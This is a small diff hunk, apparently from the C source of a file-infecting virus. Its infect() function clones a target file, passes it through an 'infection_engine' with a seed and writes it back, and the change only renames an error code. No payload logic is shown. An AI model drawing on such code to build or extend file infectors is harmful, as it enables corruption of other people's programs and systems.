@@ -57,7 +57,7 @@ inline bool	infect(const char *file, uint64_t seed[2])
 	|| !init_clone_safe(&clone_ref, original_ref.size)
 	|| !infection_engine(clone_ref, original_ref, seed)
 	|| !write_file(clone_ref, file))
-		return errors(ERR_THROW, _ERR_INFECT_IF_CANDIDATE);
+		return errors(ERR_THROW, _ERR_INFECT);
 
 	free_accessor(&original_ref);
 	free_accessor(&clone_ref);
